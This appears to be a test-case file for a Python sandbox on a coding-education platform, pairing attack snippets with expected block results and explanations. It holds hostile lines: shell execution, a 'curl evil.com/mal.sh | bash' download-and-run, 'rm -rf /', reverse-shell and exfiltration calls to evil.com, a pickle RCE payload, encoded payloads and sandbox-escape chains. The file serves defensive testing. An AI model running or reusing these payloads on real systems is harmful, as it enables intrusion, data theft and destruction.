/**
 * Python Security Attack Vectors
 *
 * Python is commonly used for scripting and has powerful system access capabilities.
 * These tests verify blocking of dangerous operations in Python code.
 *
 * Each test includes:
 * - name: Test identifier
 * - code: The malicious code attempt
 * - expectBlocked: Whether this should be blocked (true) or allowed (false)
 * - category: Attack category for grouping
 * - explanation: Human-readable description of how hackers use this attack
 */

export const pythonTests = [
  // ════════════════════════════════════════════════════════════════
  // COMMAND EXECUTION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Python: os.system',
    code: `import os; os.system('whoami')`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Direct Shell Command Execution

      How hackers use this:
      os.system() passes a command to the shell for execution.
      It's the simplest way to run arbitrary commands in Python.

      Real-world impact:
      - Execute any shell command with server privileges
      - Download and run malware: os.system('curl evil.com/mal.sh | bash')
      - Delete files: os.system('rm -rf /')
      - Modify system configuration

      Historical note:
      This is one of the most common Python RCE vectors, found in
      countless CVEs and security incidents.
    `,
  },
  {
    name: 'Python: os.popen',
    code: `import os; output = os.popen('ls -la').read()`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Command Execution with Output Capture

      How hackers use this:
      os.popen() runs a command and returns its output as a file object.
      Attackers use this to capture command results for exfiltration.

      Real-world impact:
      - Run 'cat /etc/passwd' and capture the output
      - List directories to find valuable files
      - Execute commands and process their output programmatically
    `,
  },
  {
    name: 'Python: os.exec',
    code: `import os; os.execvp('sh', ['sh', '-c', 'whoami'])`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Process Replacement via exec Family

      How hackers use this:
      os.exec* functions replace the current process with a new one.
      This is useful for running binaries directly without shell.

      Real-world impact:
      - Replace Python process with shell
      - Execute binaries without shell overhead
      - Harder to trace because process is replaced entirely
    `,
  },
  {
    name: 'Python: os.spawn',
    code: `import os; os.spawnl(os.P_WAIT, '/bin/ls', 'ls', '-la')`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Process Spawning

      How hackers use this:
      os.spawn* functions create new processes to execute programs.
      They offer more control than system() and popen().

      Real-world impact:
      - Spawn persistent processes (backdoors)
      - Execute binaries with specific arguments
      - Control process execution mode (wait/nowait)
    `,
  },
  {
    name: 'Python: subprocess.run',
    code: `import subprocess; subprocess.run(['ls', '-la'])`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Modern Subprocess Execution

      How hackers use this:
      subprocess is the recommended way to spawn processes in modern Python.
      It provides full control over stdin/stdout/stderr.

      Real-world impact:
      - Execute any system command
      - Capture and process output
      - Chain commands together
      - Most flexible command execution API
    `,
  },
  {
    name: 'Python: subprocess.Popen',
    code: `from subprocess import Popen, PIPE; p = Popen('id', shell=True, stdout=PIPE)`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Interactive Process Control

      How hackers use this:
      Popen provides low-level process control with pipes for communication.
      The shell=True parameter enables shell command interpretation.

      Real-world impact:
      - Create interactive shells
      - Pipe data between processes
      - Long-running backdoor processes

      Security note:
      shell=True is especially dangerous as it enables shell metacharacters
    `,
  },
  {
    name: 'Python: subprocess.call',
    code: `import subprocess; subprocess.call('whoami', shell=True)`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Simple Command Call

      How hackers use this:
      subprocess.call() is a simplified interface for running commands.
      Returns the exit code of the executed command.

      Real-world impact:
      - Quick command execution
      - Check if commands succeed
      - Often used in automated attack scripts
    `,
  },
  {
    name: 'Python: subprocess.check_output',
    code: `import subprocess; output = subprocess.check_output(['cat', '/etc/passwd'])`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Command Output Capture

      How hackers use this:
      check_output() runs a command and returns its output as bytes.
      Raises an exception if the command fails.

      Real-world impact:
      - Reliable output capture for data theft
      - Error handling built-in
      - Common in data exfiltration scripts
    `,
  },
  {
    name: 'Python: commands module (legacy)',
    code: `import commands; commands.getoutput('id')`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Legacy Command Execution

      How hackers use this:
      The commands module is deprecated but may exist in older systems.
      Attackers try multiple methods to increase success chances.

      Real-world impact:
      - Works on older Python 2.x systems
      - Part of comprehensive attack toolkit
      - Legacy code may still use this
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // CODE EXECUTION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Python: exec function',
    code: `exec("import os; os.system('whoami')")`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Dynamic Code Execution via exec()

      How hackers use this:
      exec() executes arbitrary Python code from a string.
      Combined with obfuscation, it's a powerful attack vector.

      Real-world impact:
      - Execute obfuscated malicious code
      - Bypass static analysis
      - Multi-stage attacks (exec downloads and runs payload)

      Common pattern:
      exec(base64.decode(obfuscated_payload))
    `,
  },
  {
    name: 'Python: eval function',
    code: `eval("__import__('os').system('id')")`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Expression Evaluation with __import__

      How hackers use this:
      eval() evaluates a Python expression. Combined with __import__(),
      it can import modules and call their functions.

      Real-world impact:
      - Single-expression RCE
      - Often found in template injection vulnerabilities
      - Common in SSTI (Server-Side Template Injection)
    `,
  },
  {
    name: 'Python: compile function',
    code: `code = compile("import os; os.system('id')", '<string>', 'exec'); exec(code)`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Compile and Execute Code

      How hackers use this:
      compile() creates code objects that can be executed later.
      This separates code creation from execution, evading some filters.

      Real-world impact:
      - Two-stage code execution
      - Code object inspection/modification
      - Bypass exec() blocking by using compile()
    `,
  },
  {
    name: 'Python: __import__ function',
    code: `__import__('os').system('id')`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Dynamic Module Import

      How hackers use this:
      __import__() is the built-in function behind the import statement.
      It allows dynamic, runtime module loading.

      Real-world impact:
      - Import dangerous modules dynamically
      - Bypass import statement blocking
      - Core primitive in Python sandbox escapes
    `,
  },
  {
    name: 'Python: importlib',
    code: `import importlib; os = importlib.import_module('os'); os.system('id')`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Import Library Module Loading

      How hackers use this:
      importlib provides programmatic import control.
      import_module() can load any module by name.

      Real-world impact:
      - Alternative to __import__()
      - More powerful module manipulation
      - Module reloading for persistence
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // FILE SYSTEM ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Python: open function',
    code: `f = open('/etc/passwd', 'r'); print(f.read())`,
    expectRefusedAtRuntime: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Direct File Reading

      How hackers use this:
      The built-in open() function provides unrestricted file access.
      Attackers use it to read sensitive files.

      Real-world impact:
      - Read /etc/passwd for user enumeration
      - Access application source code
      - Read configuration files with credentials
      - Access another student's program while it is running

      Why refused, and why the mechanism changed:
      open() used to be refused before the program started, which also removed
      file handling from the curriculum entirely - "read a file and count the
      words" could not run. It is now allowed and CONFINED: every path is
      resolved and must land inside the run's own workspace directory, so this
      attack raises PermissionError while the program runs.

      Confinement is the stronger rule, not the weaker one. A pre-run filter can
      only see the text: it cannot tell "data.txt" from a path assembled at
      runtime out of two harmless-looking halves. The guard resolves whatever the
      program actually asks for.

      The last item above is the one the container does NOT cover: every job runs
      as the same uid, so directory permissions grant nothing between jobs.
    `,
  },
  {
    name: 'Python: File write',
    code: `f = open('/tmp/backdoor.py', 'w'); f.write('malicious code'); f.close()`,
    expectRefusedAtRuntime: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Writing Malicious Files

      How hackers use this:
      Writing files enables persistent attacks - creating backdoors,
      modifying application code, or planting malware.

      Real-world impact:
      - Create web shells for persistent access
      - Modify Python scripts to inject backdoors
      - Write cron jobs for scheduled attacks
      - Plant SSH keys for future access

      Why refused:
      Writing is confined to the run's own workspace exactly as reading is, so
      this lands outside and raises PermissionError. Writing INSIDE the workspace
      is allowed and expected - it is how a student saves output - and that
      directory is deleted when the run ends, so nothing persists.
    `,
  },
  {
    name: 'Python: os.path operations',
    code: `import os.path; print(os.path.exists('/etc/shadow'))`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: File System Reconnaissance

      How hackers use this:
      os.path functions reveal information about the file system
      without directly reading files.

      Real-world impact:
      - Check if sensitive files exist
      - Map directory structure
      - Find writable locations
      - Identify valuable targets
    `,
  },
  {
    name: 'Python: os.listdir',
    code: `import os; print(os.listdir('/'))`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Directory Listing

      How hackers use this:
      os.listdir() reveals directory contents, helping attackers
      understand the system and find targets.

      Real-world impact:
      - Enumerate files in sensitive directories
      - Find configuration files
      - Discover application structure
      - Locate backup files with credentials
    `,
  },
  {
    name: 'Python: pathlib',
    code: `from pathlib import Path; print(Path('/etc/passwd').read_text())`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Modern Path Library File Access

      How hackers use this:
      pathlib is the modern, object-oriented path library.
      read_text() and read_bytes() provide easy file access.

      Real-world impact:
      - Same as open(), different API
      - May bypass filters only checking 'open'
      - Cleaner syntax for file operations
    `,
  },
  {
    name: 'Python: shutil operations',
    code: `import shutil; shutil.copy('/etc/passwd', '/tmp/stolen.txt')`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: File Copy/Move Operations

      How hackers use this:
      shutil provides high-level file operations like copy, move,
      and recursive directory operations.

      Real-world impact:
      - Copy sensitive files to accessible locations
      - Move files to disrupt applications
      - Recursive directory copying for mass theft
    `,
  },
  {
    name: 'Python: fileinput',
    code: `import fileinput; [print(l) for l in fileinput.input('/etc/passwd')]`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: File Input Iterator

      How hackers use this:
      fileinput module iterates over files, often overlooked
      in security filters.

      Real-world impact:
      - Alternative file reading method
      - Process multiple files at once
      - In-place file modification
    `,
  },
  {
    name: 'Python: io module',
    code: `import io; f = io.open('/etc/passwd'); print(f.read())`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: IO Module File Access

      How hackers use this:
      io.open() is the same as built-in open() but explicitly
      from the io module. May bypass naive filters.

      Real-world impact:
      - Alternative to open()
      - Binary and text mode support
      - Buffer control for large files
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // NETWORK ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Python: socket connection',
    code: `import socket; s = socket.socket(); s.connect(('evil.com', 4444))`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: Raw Socket Connection (Reverse Shell)

      How hackers use this:
      socket module enables raw network connections. The most common
      use is creating reverse shells.

      Real-world impact:
      - Reverse shell: socket connects to attacker, sends shell I/O
      - Data exfiltration over custom protocols
      - Port scanning and network reconnaissance

      Classic pattern:
      socket.connect(attacker) → os.dup2(socket, stdin/stdout) → exec('/bin/sh')
    `,
  },
  {
    name: 'Python: urllib request',
    code: `from urllib.request import urlopen; print(urlopen('https://evil.com').read())`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: HTTP Data Exfiltration

      How hackers use this:
      urllib provides HTTP client functionality for fetching URLs
      or sending data to external servers.

      Real-world impact:
      - Download malware payloads
      - Exfiltrate stolen data via HTTP
      - Beacon to C2 servers
      - SSRF (Server-Side Request Forgery) attacks
    `,
  },
  {
    name: 'Python: http.client',
    code: `import http.client; conn = http.client.HTTPConnection('evil.com')`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: Low-Level HTTP Client

      How hackers use this:
      http.client provides fine-grained HTTP control.
      Useful for crafted requests and custom protocols.

      Real-world impact:
      - Send custom HTTP requests
      - Exfiltrate data in HTTP headers
      - HTTP smuggling attacks
    `,
  },
  {
    name: 'Python: ftplib',
    code: `from ftplib import FTP; ftp = FTP('evil.com')`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: FTP File Transfer

      How hackers use this:
      FTP can be used to upload stolen files or download
      malware from attacker servers.

      Real-world impact:
      - Exfiltrate files via FTP
      - Download additional tools
      - Traditional protocol may bypass web filters
    `,
  },
  {
    name: 'Python: smtplib',
    code: `import smtplib; s = smtplib.SMTP('mail.evil.com')`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: Email-Based Exfiltration

      How hackers use this:
      smtplib can send emails containing stolen data.
      Email often bypasses network monitoring.

      Real-world impact:
      - Email credentials and secrets to attacker
      - Use server as spam relay
      - Covert data exfiltration channel
    `,
  },
  {
    name: 'Python: requests library',
    code: `import requests; requests.post('https://evil.com/collect', json={'secrets': 'data'})`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: HTTP Requests Library

      How hackers use this:
      requests is the most popular HTTP library in Python.
      Simple API for exfiltrating data.

      Real-world impact:
      - JSON payload exfiltration
      - Easy API interaction
      - Cookie/session handling for authenticated requests
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SYSTEM ACCESS ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Python: os.environ',
    code: `import os; print(os.environ)`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: Environment Variable Theft

      How hackers use this:
      os.environ contains all environment variables, often including
      sensitive configuration and credentials.

      Real-world impact:
      - Steal API keys (AWS_SECRET_ACCESS_KEY, etc.)
      - Get database passwords
      - Find JWT secrets
      - Access cloud credentials
    `,
  },
  {
    name: 'Python: os.getcwd',
    code: `import os; print(os.getcwd())`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: Path Information Disclosure

      How hackers use this:
      Knowing the working directory helps attackers understand
      the application structure and plan further attacks.

      Real-world impact:
      - Reveal server paths
      - Aid in path traversal attacks
      - Information gathering
    `,
  },
  {
    name: 'Python: platform info',
    code: `import platform; print(platform.system(), platform.release())`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: System Fingerprinting

      How hackers use this:
      platform module reveals OS details useful for
      selecting targeted exploits.

      Real-world impact:
      - Identify OS for targeted attacks
      - Find kernel version for exploits
      - System architecture detection
    `,
  },
  {
    name: 'Python: sys.exit',
    code: `import sys; sys.exit(1)`,
    expectBlocked: false,
    category: 'system_access',
    explanation: `
      ✅ NOT AN ATTACK - this expectation was wrong and has been corrected.

      The stated impact ("crash the application", "disrupt service for users")
      described a threat that does not exist here. sys.exit() ends the STUDENT'S
      OWN process, which is a short-lived child in its own directory that the
      runner is going to terminate anyway. It cannot touch the server, and it
      cannot affect another student's run.

      Meanwhile sys.exit() is taught in every introductory course, and refusing it
      meant a correct program was rejected with a security error.

      What IS still refused is the rest of the module - sys.modules and sys.path
      reach the import machinery, and sys._getframe walks the stack into the
      filesystem guard's own closure. So sys is permitted with an explicit
      attribute allowlist (_ALLOWED_SYS_ATTRIBUTES in preflight.py) rather than
      refused wholesale. The separate cases below cover those.
    `,
  },
  {
    name: 'Python: sys.modules',
    code: `import sys; print(sys.modules)`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: Reaching the import machinery

      sys.modules holds every loaded module object, including the ones the
      sandbox patched. Reading it is how a program finds an unwrapped reference
      to a guarded function.

      Why blocked:
      sys is allowed for the attributes a student actually uses; this is not one
      of them. Blocking the attribute rather than the module is what lets
      sys.exit() work while this does not.
    `,
  },
  {
    name: 'Python: sys._getframe',
    code: `import sys; print(sys._getframe().f_back.f_globals)`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: Walking the call stack

      _getframe hands back a frame object, and from a frame you reach f_globals
      and f_builtins - which is the standard route to the real, unwrapped open()
      that the filesystem guard replaced.

      Why blocked:
      This is precisely the attack the guard cannot defend against by itself,
      which is why the AST pass has to keep it out. The two are a pair: the guard
      confines file paths, and the AST pass keeps the guard reachable only as the
      thing it was replaced with.
    `,
  },
  {
    name: 'Python: sys.path manipulation',
    code: `import sys; sys.path.append('/'); import os`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: Widening the import path

      Appending to sys.path lets a program import from anywhere on the container,
      including a module it wrote itself a moment earlier.

      Why blocked:
      Same reason as sys.modules - an allowlisted attribute surface, and this is
      not on it.
    `,
  },
  {
    name: 'Python: workspace file I/O is allowed',
    code: `
with open('notes.txt', 'w') as handle:
    handle.write('the quick brown fox\\n')
with open('notes.txt') as handle:
    print('words:', len(handle.read().split()))
`,
    expectBlocked: false,
    expectedOutput: 'words: 4',
    category: 'file_system',
    explanation: `
      ✅ NOT AN ATTACK - and the case that motivated the whole change.

      Reading and writing files in the student's own project is a standard
      curriculum topic, and it used to be impossible: open() was refused outright,
      so "read a file and count the words" could not be set as an exercise.

      This must keep working. A regression here is not a security improvement, it
      is a feature the course loses - which is why it is asserted alongside the
      attacks rather than in a separate suite.
    `,
  },
  {
    name: 'Python: a computed path outside the workspace',
    code: `name = '/etc' + '/' + 'passwd'; print(open(name).read())`,
    expectRefusedAtRuntime: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Assembling the path so a text filter cannot see it

      The literal '/etc/passwd' never appears in the source. Any pre-run filter
      that matches on text is blind to this by construction.

      Why refused:
      The guard checks the path the program actually asks for, after it has been
      computed and resolved. This case is the clearest demonstration of why
      confinement replaced the blanket refusal rather than joining it.
    `,
  },
  {
    name: 'Python: getpass module',
    code: `import getpass; print(getpass.getuser())`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: User Information Gathering

      How hackers use this:
      getpass reveals the current user, useful for targeted
      attacks and privilege enumeration.

      Real-world impact:
      - Identify running user
      - Target specific user directories
      - Aid in privilege escalation
    `,
  },
  {
    name: 'Python: ctypes',
    code: `import ctypes; ctypes.CDLL('libc.so.6')`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: Native Code Loading

      How hackers use this:
      ctypes allows loading shared libraries and calling C functions,
      bypassing Python's safety mechanisms.

      Real-world impact:
      - Load malicious shared libraries
      - Call system functions directly
      - Bypass Python sandboxing entirely
      - Memory manipulation
    `,
  },
  {
    name: 'Python: multiprocessing',
    code: `from multiprocessing import Process; Process(target=lambda: __import__('os').system('id')).start()`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: Process Spawning for Persistence

      How hackers use this:
      multiprocessing creates child processes that survive
      parent termination.

      Real-world impact:
      - Spawn persistent backdoors
      - Fork bomb for DoS
      - Parallel attacks
    `,
  },
  {
    name: 'Python: threading',
    code: `import threading; threading.Thread(target=lambda: __import__('os').system('id')).start()`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: Background Thread Execution

      How hackers use this:
      Threads run concurrently, potentially executing malicious
      code in the background.

      Real-world impact:
      - Background malware execution
      - Evade single-threaded monitoring
      - Parallel data processing
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // PICKLE/SERIALIZATION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Python: pickle deserialization',
    code: `import pickle; pickle.loads(b"cos\\nsystem\\n(S'id'\\ntR.")`,
    expectBlocked: true,
    category: 'deserialization',
    explanation: `
      🎯 ATTACK: Pickle Deserialization RCE

      How hackers use this:
      pickle can execute arbitrary code during deserialization.
      Malicious pickle payloads achieve RCE when unpickled.

      Real-world impact:
      - Classic Python deserialization vulnerability
      - The payload shown executes os.system('id')
      - Common in web apps accepting pickled data

      Warning:
      NEVER unpickle data from untrusted sources!
    `,
  },
  {
    name: 'Python: marshal',
    code: `import marshal; marshal.loads(b'data')`,
    expectBlocked: true,
    category: 'deserialization',
    explanation: `
      🎯 ATTACK: Marshal Code Object Loading

      How hackers use this:
      marshal deserializes Python code objects.
      Can load malicious compiled Python bytecode.

      Real-world impact:
      - Load pre-compiled malicious code
      - Bypass source code analysis
      - Execute obfuscated payloads
    `,
  },
  {
    name: 'Python: shelve',
    code: `import shelve; db = shelve.open('/tmp/evil')`,
    expectBlocked: true,
    category: 'deserialization',
    explanation: `
      🎯 ATTACK: Shelve Persistent Objects

      How hackers use this:
      shelve uses pickle internally, inheriting its vulnerabilities.
      Creates persistent storage that could contain malicious objects.

      Real-world impact:
      - Persistent pickle storage
      - Same RCE risks as pickle
      - File-based attack persistence
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // ENCODING BYPASS ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Python: base64 decode bypass',
    code: `import base64; exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk='))`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 ATTACK: Base64 Encoded Payload

      How hackers use this:
      Base64 encoding hides malicious code from simple filters.
      The encoded string decodes to: import os; os.system('id')

      Real-world impact:
      - Bypass pattern-based filters
      - Hide payload in seemingly random strings
      - Standard malware obfuscation technique
    `,
  },
  {
    name: 'Python: chr() bypass',
    code: `exec(''.join([chr(105),chr(109),chr(112),chr(111),chr(114),chr(116)]))`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 ATTACK: Character Code Obfuscation

      How hackers use this:
      Building strings from chr() codes hides keywords from filters.
      chr(105),chr(109)... spells 'import'.

      Real-world impact:
      - Bypass keyword filters
      - Each character as a number
      - Common in CTF exploits
    `,
  },
  {
    name: 'Python: hex decode bypass',
    code: `exec(bytes.fromhex('696d706f7274206f73').decode())`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 ATTACK: Hex Encoded Payload

      How hackers use this:
      Hex encoding is an alternative to base64 for hiding code.
      '696d706f7274206f73' = 'import os'

      Real-world impact:
      - Alternative to base64
      - Bypasses base64-specific filters
      - Less suspicious than base64 strings
    `,
  },
  {
    name: 'Python: codecs bypass',
    code: `import codecs; exec(codecs.decode('vzcbeg bf', 'rot_13'))`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 ATTACK: ROT13/Codec Obfuscation

      How hackers use this:
      codecs module supports various encodings including rot_13.
      'vzcbeg bf' in rot_13 is 'import os'.

      Real-world impact:
      - Multiple encoding options
      - rot_13 is simple letter substitution
      - Can chain multiple encodings
    `,
  },
  {
    name: 'Python: zlib decompress bypass',
    code: `import zlib; exec(zlib.decompress(b'x\\x9c+\\xca\\xcc+\\xd1H\\xcf\\xc9OH\\xcc)f\\x00\\x00\\x1e\\x06\\x04\\xa3'))`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 ATTACK: Compressed Payload

      How hackers use this:
      Compression hides code and reduces payload size.
      The compressed data decompresses to malicious code.

      Real-world impact:
      - Smaller payload for injection
      - Harder to detect patterns
      - Binary data looks like garbage
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // INTROSPECTION/REFLECTION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Python: globals() access',
    code: `print(globals())`,
    expectBlocked: true,
    category: 'introspection',
    explanation: `
      🎯 ATTACK: Global Namespace Access

      How hackers use this:
      globals() returns the global symbol table, exposing imported
      modules and functions.

      Real-world impact:
      - Discover available modules
      - Access __builtins__ for dangerous functions
      - Find application secrets in globals
    `,
  },
  {
    name: 'Python: locals() access',
    code: `print(locals())`,
    expectBlocked: true,
    category: 'introspection',
    explanation: `
      🎯 ATTACK: Local Namespace Access

      How hackers use this:
      locals() exposes local variables which might contain
      sensitive data or useful references.

      Real-world impact:
      - Find variables with secrets
      - Discover local module imports
      - Information disclosure
    `,
  },
  {
    name: 'Python: vars() access',
    code: `print(vars())`,
    expectBlocked: true,
    category: 'introspection',
    explanation: `
      🎯 ATTACK: Variable Dictionary Access

      How hackers use this:
      vars() returns __dict__ of an object or local namespace.
      Exposes internal object state.

      Real-world impact:
      - Access object internals
      - Modify private attributes
      - Similar to globals()/locals()
    `,
  },
  {
    name: 'Python: dir() enumeration',
    code: `print(dir(__builtins__))`,
    expectBlocked: true,
    category: 'introspection',
    explanation: `
      🎯 ATTACK: Attribute Enumeration

      How hackers use this:
      dir() lists all attributes of an object.
      Used to discover available functions and methods.

      Real-world impact:
      - Enumerate available functions
      - Find undocumented capabilities
      - Map object interfaces
    `,
  },
  {
    name: 'Python: getattr dynamic access',
    code: `getattr(__builtins__, '__import__')('os').system('id')`,
    expectBlocked: true,
    category: 'introspection',
    explanation: `
      🎯 ATTACK: Dynamic Attribute Access

      How hackers use this:
      getattr() retrieves attributes by name, enabling dynamic
      access to dangerous functions.

      Real-world impact:
      - Access blocked attributes dynamically
      - Bypass direct attribute blocking
      - Core sandbox escape technique
    `,
  },
  {
    name: 'Python: __subclasses__ traversal',
    code: `print(().__class__.__bases__[0].__subclasses__())`,
    expectBlocked: true,
    category: 'introspection',
    explanation: `
      🎯 ATTACK: Class Hierarchy Traversal

      How hackers use this:
      __subclasses__() returns all subclasses of a class.
      Used to find classes with dangerous capabilities.

      Real-world impact:
      - Find classes with file access (like FileLoader)
      - Locate classes with code execution methods
      - Classic Python sandbox escape

      Common pattern:
      tuple.__mro__[1].__subclasses__() → find os._wrap_close → access os
    `,
  },
  {
    name: 'Python: __mro__ traversal',
    code: `print(().__class__.__mro__)`,
    expectBlocked: true,
    category: 'introspection',
    explanation: `
      🎯 ATTACK: Method Resolution Order Traversal

      How hackers use this:
      __mro__ shows the inheritance chain. Combined with __subclasses__,
      it enables traversing the entire class hierarchy.

      Real-world impact:
      - Navigate to object base class
      - Find all classes in the system
      - Gateway to dangerous classes
    `,
  },
  {
    name: 'Python: __builtins__ access',
    code: `print(__builtins__)`,
    expectBlocked: true,
    category: 'introspection',
    explanation: `
      🎯 ATTACK: Builtins Module Access

      How hackers use this:
      __builtins__ contains all built-in functions including
      dangerous ones like __import__, eval, exec.

      Real-world impact:
      - Access dangerous built-in functions
      - Even if direct names are blocked
      - __builtins__.__import__ is common bypass
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // AST/CODE OBJECT ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Python: ast module',
    code: `import ast; tree = ast.parse('import os; os.system("id")')`,
    expectBlocked: true,
    category: 'code_manipulation',
    explanation: `
      🎯 ATTACK: AST Manipulation

      How hackers use this:
      ast module parses Python code into abstract syntax trees.
      Can be used to generate or modify code dynamically.

      Real-world impact:
      - Generate malicious code programmatically
      - Modify legitimate code at runtime
      - Create obfuscated payloads
    `,
  },
  {
    name: 'Python: dis module',
    code: `import dis; dis.dis(lambda: __import__('os'))`,
    expectBlocked: true,
    category: 'code_manipulation',
    explanation: `
      🎯 ATTACK: Bytecode Disassembly

      How hackers use this:
      dis module shows Python bytecode. Useful for understanding
      how security measures work to bypass them.

      Real-world impact:
      - Reverse engineer security code
      - Understand bytecode for manipulation
      - Educational for creating exploits
    `,
  },
  {
    name: 'Python: types.CodeType',
    code: `import types; code = types.CodeType(0,0,0,0,0,0,b'',(),(),(),'','',0,b'')`,
    expectBlocked: true,
    category: 'code_manipulation',
    explanation: `
      🎯 ATTACK: Code Object Creation

      How hackers use this:
      CodeType creates raw code objects from components.
      Can craft malicious bytecode directly.

      Real-world impact:
      - Create executable code objects
      - Bypass source code analysis
      - Inject bytecode directly
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SIGNAL/INTERRUPT ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Python: signal handling',
    code: `import signal; signal.signal(signal.SIGTERM, lambda s,f: __import__('os').system('id'))`,
    expectBlocked: true,
    category: 'signal_handling',
    explanation: `
      🎯 ATTACK: Signal Handler Code Execution

      How hackers use this:
      Signal handlers execute when signals are received.
      Malicious handlers can trigger on process events.

      Real-world impact:
      - Execute code on termination
      - Persistence through signal handling
      - Triggered by external events
    `,
  },
  {
    name: 'Python: atexit',
    code: `import atexit; atexit.register(lambda: __import__('os').system('id'))`,
    expectBlocked: true,
    category: 'signal_handling',
    explanation: `
      🎯 ATTACK: Exit Handler Registration

      How hackers use this:
      atexit registers functions to run at program exit.
      Malicious exit handlers persist until shutdown.

      Real-world impact:
      - Execute code at termination
      - Guaranteed execution even on errors
      - Cleanup-based persistence
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SAFE CODE
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Python: Safe print',
    code: `print('Hello, World!')`,
    expectBlocked: false,
    expectedOutput: 'Hello, World!',
    category: 'safe_code',
    explanation: `
      ✅ SAFE: Basic Output

      This is legitimate code that should execute:
      print() is fundamental for learning Python and
      debugging code. Completely safe.
    `,
  },
  {
    name: 'Python: Safe math',
    code: `print(2 + 2)`,
    expectBlocked: false,
    expectedOutput: '4',
    category: 'safe_code',
    explanation: `
      ✅ SAFE: Mathematical Operations

      This is legitimate code that should execute:
      Basic arithmetic is essential for any programming.
    `,
  },
  {
    name: 'Python: Safe list comprehension',
    code: `print([x**2 for x in range(5)])`,
    expectBlocked: false,
    expectedOutput: '[0, 1, 4, 9, 16]',
    category: 'safe_code',
    explanation: `
      ✅ SAFE: List Comprehension

      This is legitimate code that should execute:
      List comprehensions are Pythonic and commonly
      taught in introductory courses.
    `,
  },
  {
    name: 'Python: Safe class definition',
    code: `class Point:
    def __init__(self, x, y):
        self.x = x
        self.y = y
p = Point(3, 4)
print(p.x + p.y)`,
    expectBlocked: false,
    expectedOutput: '7',
    category: 'safe_code',
    explanation: `
      ✅ SAFE: Object-Oriented Programming

      This is legitimate code that should execute:
      Class definitions and object creation are
      fundamental to Python development.
    `,
  },
  {
    name: 'Python: Safe lambda',
    code: `double = lambda x: x * 2; print(double(5))`,
    expectBlocked: false,
